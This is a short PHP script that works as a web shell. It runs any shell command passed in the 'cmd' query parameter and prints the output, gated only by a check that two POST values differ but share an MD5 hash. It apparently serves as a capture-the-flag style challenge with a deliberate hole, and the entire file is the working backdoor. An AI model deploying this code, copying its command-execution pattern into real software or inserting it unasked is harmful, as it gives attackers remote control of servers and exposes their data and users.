<?php
$cmd=$_GET['cmd'];
if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
} 
else {
        echo (string)$_POST['a'],(string)$_POST['b'];
}
?>